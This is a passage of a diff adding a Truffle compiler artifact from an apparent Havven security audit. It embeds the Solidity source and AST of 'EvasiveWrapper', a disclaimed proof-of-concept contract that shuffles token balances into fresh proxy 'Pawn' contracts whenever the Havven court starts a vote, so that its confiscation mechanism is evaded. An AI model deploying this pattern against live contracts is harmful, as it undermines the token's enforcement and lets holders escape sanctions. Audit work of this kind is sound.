@@ -1,0 +1,2167 @@
+{
+  "contractName": "SlimEtherNomin",
+  "abi": [
+    {
+      "constant": true,
+      "inputs": [],
+      "name": "court",
+      "outputs": [
+        {
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "constant": true,
+      "inputs": [
+        {
+          "name": "who",
+          "type": "address"
+        }
+      ],
+      "name": "balanceOf",
+      "outputs": [
+        {
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "constant": false,
+      "inputs": [
+        {
+          "name": "to",
+          "type": "address"
+        },
+        {
+          "name": "value",
+          "type": "uint256"
+        }
+      ],
+      "name": "transfer",
+      "outputs": [
+        {
+          "name": "",
+          "type": "bool"
+        }
+      ],
+      "payable": false,
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "bytecode": "0x",
+  "deployedBytecode": "0x",
+  "sourceMap": "",
+  "deployedSourceMap": "",
+  "source": "/*\n * EvasiveWrapper.sol\n *\n * This is a proof-of concept contract to demonstrate a \n * method for avoiding the Havven court contract.\n *\n * This contract is not production-ready and should not be used\n * to store any value. The authors do not condone the use of this\n * contract. This contract exists only for research purposes.\n */\npragma solidity ^0.4.19;\n\ncontract SlimCourt {\n    mapping(address => uint) public voteStartTimes;\n}\n\ncontract SlimEtherNomin {\n    SlimCourt public court;\n    function balanceOf(address who) public view returns (uint256);\n    function transfer(address to, uint256 value) public returns (bool);\n}\n\ncontract Pawn {\n\taddress public owner;\n\tSlimEtherNomin public target;\n\n\tfunction Pawn(address _target) public {\n\t\towner = msg.sender;\n\t\ttarget = SlimEtherNomin(_target);\n\t}\n\t\n\tfunction() public {\n\t\trequire(msg.sender == owner);\n\t\ttarget.call(msg.data);\n    }\n}\n\ncontract EvasiveWrapper {\n\tSlimEtherNomin public nomin;\n\taddress public pawn;\n\n\tfunction EvasiveWrapper(address _nomin) public {\n\t\tnomin = SlimEtherNomin(_nomin);\n\t\tpawn = new Pawn(nomin);\n\t}\n\n\tfunction evade() public {\n\t\tSlimCourt court = nomin.court();\n\t\tif(court.voteStartTimes(this) > 0)  {\n\t\t\tnewPawn();\n\t\t}\n\t}\n\n\tfunction newPawn() internal {\n\t\tSlimEtherNomin oldPawn = SlimEtherNomin(pawn);\n\t\tpawn = new Pawn(nomin);\n\t\tuint balanceToMigrate = nomin.balanceOf(oldPawn);\n\t\tif(balanceToMigrate > 0) {\n\t\t    oldPawn.transfer(pawn, balanceToMigrate);\n\t\t}\n\t}\n}\n",
+  "sourcePath": "/home/paul/Dropbox/Personal/pcs/miniparch/development/havven/audit/truffle/contracts/EvasiveWrapper.sol",
+  "ast": {
+    "attributes": {
+      "absolutePath": "/home/paul/Dropbox/Personal/pcs/miniparch/development/havven/audit/truffle/contracts/EvasiveWrapper.sol",
+      "exportedSymbols": {
+        "EvasiveWrapper": [
+          146
+        ],
+        "Pawn": [
+          65
+        ],
+        "SlimCourt": [
+          6
+        ],
+        "SlimEtherNomin": [
+          25
+        ]
+      }
+    },
+    "children": [
+      {
+        "attributes": {
+          "literals": [
+            "solidity",
+            "^",
+            "0.4",
+            ".19"
+          ]
+        },
+        "id": 1,
+        "name": "PragmaDirective",
+        "src": "334:24:0"
+      },
+      {
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            null
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": true,
+          "linearizedBaseContracts": [
+            6
+          ],
+          "name": "SlimCourt",
+          "scope": 147
+        },
+        "children": [
+          {
+            "attributes": {
+              "constant": false,
+              "name": "voteStartTimes",
+              "scope": 6,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "mapping(address => uint256)",
+              "value": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "type": "mapping(address => uint256)"
+                },
+                "children": [
+                  {
+                    "attributes": {
+                      "name": "address",
+                      "type": "address"
+                    },
+                    "id": 2,
+                    "name": "ElementaryTypeName",
+                    "src": "393:7:0"
+                  },
+                  {
+                    "attributes": {
+                      "name": "uint",
+                      "type": "uint256"
+                    },
+                    "id": 3,
+                    "name": "ElementaryTypeName",
+                    "src": "404:4:0"
+                  }
+                ],
+                "id": 4,
+                "name": "Mapping",
+                "src": "385:24:0"
+              }
+            ],
+            "id": 5,
+            "name": "VariableDeclaration",
+            "src": "385:46:0"
+          }
+        ],
+        "id": 6,
+        "name": "ContractDefinition",
+        "src": "360:74:0"
+      },
+      {
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            null
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": false,
+          "linearizedBaseContracts": [
+            25
+          ],
+          "name": "SlimEtherNomin",
+          "scope": 147
+        },
+        "children": [
+          {
+            "attributes": {
+              "constant": false,
+              "name": "court",
+              "scope": 25,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "contract SlimCourt",
+              "value": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "contractScope": null,
+                  "name": "SlimCourt",
+                  "referencedDeclaration": 6,
+                  "type": "contract SlimCourt"
+                },
+                "id": 7,
+                "name": "UserDefinedTypeName",
+                "src": "466:9:0"
+              }
+            ],
+            "id": 8,
+            "name": "VariableDeclaration",
+            "src": "466:22:0"
+          },
+          {
+            "attributes": {
+              "body": null,
+              "constant": true,
+              "implemented": false,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "balanceOf",
+              "payable": false,
+              "scope": 25,
+              "stateMutability": "view",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "who",
+                      "scope": 15,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "address",
+                          "type": "address"
+                        },
+                        "id": 9,
+                        "name": "ElementaryTypeName",
+                        "src": "513:7:0"
+                      }
+                    ],
+                    "id": 10,
+                    "name": "VariableDeclaration",
+                    "src": "513:11:0"
+                  }
+                ],
+                "id": 11,
+                "name": "ParameterList",
+                "src": "512:13:0"
+              },
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "",
+                      "scope": 15,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "uint256",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "uint256",
+                          "type": "uint256"
+                        },
+                        "id": 12,
+                        "name": "ElementaryTypeName",
+                        "src": "547:7:0"
+                      }
+                    ],
+                    "id": 13,
+                    "name": "VariableDeclaration",
+                    "src": "547:7:0"
+                  }
+                ],
+                "id": 14,
+                "name": "ParameterList",
+                "src": "546:9:0"
+              }
+            ],
+            "id": 15,
+            "name": "FunctionDefinition",
+            "src": "494:62:0"
+          },
+          {
+            "attributes": {
+              "body": null,
+              "constant": false,
+              "implemented": false,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "transfer",
+              "payable": false,
+              "scope": 25,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "to",
+                      "scope": 24,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "address",
+                          "type": "address"
+                        },
+                        "id": 16,
+                        "name": "ElementaryTypeName",
+                        "src": "579:7:0"
+                      }
+                    ],
+                    "id": 17,
+                    "name": "VariableDeclaration",
+                    "src": "579:10:0"
+                  },
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "value",
+                      "scope": 24,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "uint256",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "uint256",
+                          "type": "uint256"
+                        },
+                        "id": 18,
+                        "name": "ElementaryTypeName",
+                        "src": "591:7:0"
+                      }
+                    ],
+                    "id": 19,
+                    "name": "VariableDeclaration",
+                    "src": "591:13:0"
+                  }
+                ],
+                "id": 20,
+                "name": "ParameterList",
+                "src": "578:27:0"
+              },
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "",
+                      "scope": 24,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "bool",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "bool",
+                          "type": "bool"
+                        },
+                        "id": 21,
+                        "name": "ElementaryTypeName",
+                        "src": "622:4:0"
+                      }
+                    ],
+                    "id": 22,
+                    "name": "VariableDeclaration",
+                    "src": "622:4:0"
+                  }
+                ],
+                "id": 23,
+                "name": "ParameterList",
+                "src": "621:6:0"
+              }
+            ],
+            "id": 24,
+            "name": "FunctionDefinition",
+            "src": "561:67:0"
+          }
+        ],
+        "id": 25,
+        "name": "ContractDefinition",
+        "src": "436:194:0"
+      },
+      {
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            null
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": true,
+          "linearizedBaseContracts": [
+            65
+          ],
+          "name": "Pawn",
+          "scope": 147
+        },
+        "children": [
+          {
+            "attributes": {
+              "constant": false,
+              "name": "owner",
+              "scope": 65,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "address",
+              "value": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "address",
+                  "type": "address"
+                },
+                "id": 26,
+                "name": "ElementaryTypeName",
+                "src": "649:7:0"
+              }
+            ],
+            "id": 27,
+            "name": "VariableDeclaration",
+            "src": "649:20:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "target",
+              "scope": 65,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "contract SlimEtherNomin",
+              "value": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "contractScope": null,
+                  "name": "SlimEtherNomin",
+                  "referencedDeclaration": 25,
+                  "type": "contract SlimEtherNomin"
+                },
+                "id": 28,
+                "name": "UserDefinedTypeName",
+                "src": "672:14:0"
+              }
+            ],
+            "id": 29,
+            "name": "VariableDeclaration",
+            "src": "672:28:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": true,
+              "modifiers": [
+                null
+              ],
+              "name": "Pawn",
+              "payable": false,
+              "scope": 65,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "_target",
+                      "scope": 46,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "address",
+                          "type": "address"
+                        },
+                        "id": 30,
+                        "name": "ElementaryTypeName",
+                        "src": "718:7:0"
+                      }
+                    ],
+                    "id": 31,
+                    "name": "VariableDeclaration",
+                    "src": "718:15:0"
+                  }
+                ],
+                "id": 32,
+                "name": "ParameterList",
+                "src": "717:17:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 33,
+                "name": "ParameterList",
+                "src": "742:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "address"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 27,
+                              "type": "address",
+                              "value": "owner"
+                            },
+                            "id": 34,
+                            "name": "Identifier",
+                            "src": "746:5:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "sender",
+                              "referencedDeclaration": null,
+                              "type": "address"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 158,
+                                  "type": "msg",
+                                  "value": "msg"
+                                },
+                                "id": 35,
+                                "name": "Identifier",
+                                "src": "754:3:0"
+                              }
+                            ],
+                            "id": 36,
+                            "name": "MemberAccess",
+                            "src": "754:10:0"
+                          }
+                        ],
+                        "id": 37,
+                        "name": "Assignment",
+                        "src": "746:18:0"
+                      }
+                    ],
+                    "id": 38,
+                    "name": "ExpressionStatement",
+                    "src": "746:18:0"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "contract SlimEtherNomin"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 29,
+                              "type": "contract SlimEtherNomin",
+                              "value": "target"
+                            },
+                            "id": 39,
+                            "name": "Identifier",
+                            "src": "768:6:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "contract SlimEtherNomin",
+                              "type_conversion": true
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_address",
+                                      "typeString": "address"
+                                    }
+                                  ],
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 25,
+                                  "type": "type(contract SlimEtherNomin)",
+                                  "value": "SlimEtherNomin"
+                                },
+                                "id": 40,
+                                "name": "Identifier",
+                                "src": "777:14:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 31,
+                                  "type": "address",
+                                  "value": "_target"
+                                },
+                                "id": 41,
+                                "name": "Identifier",
+                                "src": "792:7:0"
+                              }
+                            ],
+                            "id": 42,
+                            "name": "FunctionCall",
+                            "src": "777:23:0"
+                          }
+                        ],
+                        "id": 43,
+                        "name": "Assignment",
+                        "src": "768:32:0"
+                      }
+                    ],
+                    "id": 44,
+                    "name": "ExpressionStatement",
+                    "src": "768:32:0"
+                  }
+                ],
+                "id": 45,
+                "name": "Block",
+                "src": "742:62:0"
+              }
+            ],
+            "id": 46,
+            "name": "FunctionDefinition",
+            "src": "704:100:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "",
+              "payable": false,
+              "scope": 65,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 47,
+                "name": "ParameterList",
+                "src": "816:2:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 48,
+                "name": "ParameterList",
+                "src": "826:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_bool",
+                                  "typeString": "bool"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 161,
+                              "type": "function (bool) pure",
+                              "value": "require"
+                            },
+                            "id": 49,
+                            "name": "Identifier",
+                            "src": "830:7:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "commonType": {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              },
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "operator": "==",
+                              "type": "bool"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "member_name": "sender",
+                                  "referencedDeclaration": null,
+                                  "type": "address"
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 158,
+                                      "type": "msg",
+                                      "value": "msg"
+                                    },
+                                    "id": 50,
+                                    "name": "Identifier",
+                                    "src": "838:3:0"
+                                  }
+                                ],
+                                "id": 51,
+                                "name": "MemberAccess",
+                                "src": "838:10:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 27,
+                                  "type": "address",
+                                  "value": "owner"
+                                },
+                                "id": 52,
+                                "name": "Identifier",
+                                "src": "852:5:0"
+                              }
+                            ],
+                            "id": 53,
+                            "name": "BinaryOperation",
+                            "src": "838:19:0"
+                          }
+                        ],
+                        "id": 54,
+                        "name": "FunctionCall",
+                        "src": "830:28:0"
+                      }
+                    ],
+                    "id": 55,
+                    "name": "ExpressionStatement",
+                    "src": "830:28:0"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "bool",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_bytes_calldata_ptr",
+                                  "typeString": "bytes calldata"
+                                }
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "call",
+                              "referencedDeclaration": null,
+                              "type": "function () payable returns (bool)"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 29,
+                                  "type": "contract SlimEtherNomin",
+                                  "value": "target"
+                                },
+                                "id": 56,
+                                "name": "Identifier",
+                                "src": "862:6:0"
+                              }
+                            ],
+                            "id": 58,
+                            "name": "MemberAccess",
+                            "src": "862:11:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "data",
+                              "referencedDeclaration": null,
+                              "type": "bytes calldata"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 158,
+                                  "type": "msg",
+                                  "value": "msg"
+                                },
+                                "id": 59,
+                                "name": "Identifier",
+                                "src": "874:3:0"
+                              }
+                            ],
+                            "id": 60,
+                            "name": "MemberAccess",
+                            "src": "874:8:0"
+                          }
+                        ],
+                        "id": 61,
+                        "name": "FunctionCall",
+                        "src": "862:21:0"
+                      }
+                    ],
+                    "id": 62,
+                    "name": "ExpressionStatement",
+                    "src": "862:21:0"
+                  }
+                ],
+                "id": 63,
+                "name": "Block",
+                "src": "826:64:0"
+              }
+            ],
+            "id": 64,
+            "name": "FunctionDefinition",
+            "src": "808:82:0"
+          }
+        ],
+        "id": 65,
+        "name": "ContractDefinition",
+        "src": "632:260:0"
+      },
+      {
+        "attributes": {
+          "baseContracts": [
+            null
+          ],
+          "contractDependencies": [
+            65
+          ],
+          "contractKind": "contract",
+          "documentation": null,
+          "fullyImplemented": true,
+          "linearizedBaseContracts": [
+            146
+          ],
+          "name": "EvasiveWrapper",
+          "scope": 147
+        },
+        "children": [
+          {
+            "attributes": {
+              "constant": false,
+              "name": "nomin",
+              "scope": 146,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "contract SlimEtherNomin",
+              "value": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "contractScope": null,
+                  "name": "SlimEtherNomin",
+                  "referencedDeclaration": 25,
+                  "type": "contract SlimEtherNomin"
+                },
+                "id": 66,
+                "name": "UserDefinedTypeName",
+                "src": "921:14:0"
+              }
+            ],
+            "id": 67,
+            "name": "VariableDeclaration",
+            "src": "921:27:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "name": "pawn",
+              "scope": 146,
+              "stateVariable": true,
+              "storageLocation": "default",
+              "type": "address",
+              "value": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "name": "address",
+                  "type": "address"
+                },
+                "id": 68,
+                "name": "ElementaryTypeName",
+                "src": "951:7:0"
+              }
+            ],
+            "id": 69,
+            "name": "VariableDeclaration",
+            "src": "951:19:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": true,
+              "modifiers": [
+                null
+              ],
+              "name": "EvasiveWrapper",
+              "payable": false,
+              "scope": 146,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "constant": false,
+                      "name": "_nomin",
+                      "scope": 88,
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "type": "address",
+                      "value": null,
+                      "visibility": "internal"
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "name": "address",
+                          "type": "address"
+                        },
+                        "id": 70,
+                        "name": "ElementaryTypeName",
+                        "src": "998:7:0"
+                      }
+                    ],
+                    "id": 71,
+                    "name": "VariableDeclaration",
+                    "src": "998:14:0"
+                  }
+                ],
+                "id": 72,
+                "name": "ParameterList",
+                "src": "997:16:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 73,
+                "name": "ParameterList",
+                "src": "1021:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "contract SlimEtherNomin"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 67,
+                              "type": "contract SlimEtherNomin",
+                              "value": "nomin"
+                            },
+                            "id": 74,
+                            "name": "Identifier",
+                            "src": "1025:5:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "contract SlimEtherNomin",
+                              "type_conversion": true
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_address",
+                                      "typeString": "address"
+                                    }
+                                  ],
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 25,
+                                  "type": "type(contract SlimEtherNomin)",
+                                  "value": "SlimEtherNomin"
+                                },
+                                "id": 75,
+                                "name": "Identifier",
+                                "src": "1033:14:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 71,
+                                  "type": "address",
+                                  "value": "_nomin"
+                                },
+                                "id": 76,
+                                "name": "Identifier",
+                                "src": "1048:6:0"
+                              }
+                            ],
+                            "id": 77,
+                            "name": "FunctionCall",
+                            "src": "1033:22:0"
+                          }
+                        ],
+                        "id": 78,
+                        "name": "Assignment",
+                        "src": "1025:30:0"
+                      }
+                    ],
+                    "id": 79,
+                    "name": "ExpressionStatement",
+                    "src": "1025:30:0"
+                  },
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "=",
+                          "type": "address"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 69,
+                              "type": "address",
+                              "value": "pawn"
+                            },
+                            "id": 80,
+                            "name": "Identifier",
+                            "src": "1059:4:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "contract Pawn",
+                              "type_conversion": false
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_contract$_SlimEtherNomin_$25",
+                                      "typeString": "contract SlimEtherNomin"
+                                    }
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "lValueRequested": false,
+                                  "type": "function (address) returns (contract Pawn)"
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "contractScope": null,
+                                      "name": "Pawn",
+                                      "referencedDeclaration": 65,
+                                      "type": "contract Pawn"
+                                    },
+                                    "id": 81,
+                                    "name": "UserDefinedTypeName",
+                                    "src": "1070:4:0"
+                                  }
+                                ],
+                                "id": 82,
+                                "name": "NewExpression",
+                                "src": "1066:8:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 67,
+                                  "type": "contract SlimEtherNomin",
+                                  "value": "nomin"
+                                },
+                                "id": 83,
+                                "name": "Identifier",
+                                "src": "1075:5:0"
+                              }
+                            ],
+                            "id": 84,
+                            "name": "FunctionCall",
+                            "src": "1066:15:0"
+                          }
+                        ],
+                        "id": 85,
+                        "name": "Assignment",
+                        "src": "1059:22:0"
+                      }
+                    ],
+                    "id": 86,
+                    "name": "ExpressionStatement",
+                    "src": "1059:22:0"
+                  }
+                ],
+                "id": 87,
+                "name": "Block",
+                "src": "1021:64:0"
+              }
+            ],
+            "id": 88,
+            "name": "FunctionDefinition",
+            "src": "974:111:0"
+          },
+          {
+            "attributes": {
+              "constant": false,
+              "implemented": true,
+              "isConstructor": false,
+              "modifiers": [
+                null
+              ],
+              "name": "evade",
+              "payable": false,
+              "scope": 146,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 89,
+                "name": "ParameterList",
+                "src": "1102:2:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 90,
+                "name": "ParameterList",
+                "src": "1112:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "attributes": {
+                      "assignments": [
+                        92
+                      ]
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "constant": false,
+                          "name": "court",
+                          "scope": 109,
+                          "stateVariable": false,
+                          "storageLocation": "default",
+                          "type": "contract SlimCourt",
+                          "value": null,
+                          "visibility": "internal"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "contractScope": null,
+                              "name": "SlimCourt",
+                              "referencedDeclaration": 6,
+                              "type": "contract SlimCourt"
+                            },
+                            "id": 91,
+                            "name": "UserDefinedTypeName",
+                            "src": "1116:9:0"
+                          }
+                        ],
+                        "id": 92,
+                        "name": "VariableDeclaration",
+                        "src": "1116:15:0"
+                      },
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            null
+                          ],
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "contract SlimCourt",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                null
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "court",
+                              "referencedDeclaration": 8,
+                              "type": "function () view external returns (contract SlimCourt)"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 67,
+                                  "type": "contract SlimEtherNomin",
+                                  "value": "nomin"
+                                },
+                                "id": 93,
+                                "name": "Identifier",
+                                "src": "1134:5:0"
+                              }
+                            ],
+                            "id": 94,
+                            "name": "MemberAccess",
+                            "src": "1134:11:0"
+                          }
+                        ],
+                        "id": 95,
+                        "name": "FunctionCall",
+                        "src": "1134:13:0"
+                      }
+                    ],
